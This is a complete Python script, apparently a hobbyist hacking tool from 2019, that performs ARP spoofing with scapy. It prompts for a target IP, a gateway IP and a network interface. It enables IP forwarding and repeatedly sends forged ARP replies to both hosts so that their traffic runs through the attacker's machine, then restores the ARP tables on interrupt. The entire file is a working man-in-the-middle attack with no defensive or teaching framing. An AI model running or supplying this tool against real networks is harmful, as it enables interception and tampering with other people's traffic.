#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time
import sys
import os

# pip install scapy


def spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip, interface)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=interface)


def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=interface)[0]
    return answered_list[0][1].hwsrc


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Please enter the target IP")
    parser.add_option("-s", "--spoof", dest="spoof", help="Please enter the spoofed IP")
    parser.add_option("-i", "--interface", dest="interface", help="Please enter the desired INTERFACE")
    (options, arguments) = parser.parse_args()
    return options


def restore_spoof(target_ip, spoof_ip, interface):
    target_mac = get_mac(target_ip, interface)
    spoof_mac = get_mac(spoof_ip,interface)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, count=4, verbose=False, iface=interface)


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
options = get_arguments()
if options.interface == "wlan0":
    os.system("ifconfig eth0 down")
if not options.target:
    print(" J3wker | ARP Spoofing | 2019 ")
    print("-------------------------------------\n")
    print("[+] Enabling IP Forwarding")
    print("-------------------------------------")
    options.target = raw_input("Enter the Target IP >> ")
    print("-----")
    options.spoof = raw_input("Enter the gateway IP >> ")
    print("-----")
    options.interface = raw_input("Enter the interface name >> ")
    print("-----")
    if options.interface == "wlan0":
        os.system("ifconfig eth0 down")
    try:
        sent_packet_count = 0
        while True:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            spoof(options.target, options.spoof, options.interface)
            spoof(options.spoof, options.target, options.interface)
            sent_packet_count = sent_packet_count + 2
            print("\rTelling " + options.target + " i am " + options.spoof + " [+] Packets sent: " + str(
                sent_packet_count)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL +C ..... Restting the ARP table.. Please wait.\n")
        restore_spoof(options.target, options.spoof, options.interface)
        restore_spoof(options.spoof, options.target, options.interface)
        print("ARP Table is now back to normal")
        if options.interface == "wlan0":
            os.system("ifconfig eth0 up")
else:
    try:
        options = get_arguments()
        sent_packet_count = 0
        while True:
            spoof(options.target, options.spoof, options.interface)
            spoof(options.spoof, options.target, options.interface)
            sent_packet_count = sent_packet_count + 2
            print("\rTelling " + options.target + " i am " + options.spoof + " [+] Packets sent: " + str(sent_packet_count)),
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL +C ..... Restting the ARP table.. Please wait.\n")
        restore_spoof(options.target, options.spoof, options.interface)
        restore_spoof(options.spoof, options.target, options.interface)
        print("ARP Table is now back to normal")
        if options.interface == "wlan0":
            os.system("ifconfig eth0 up")
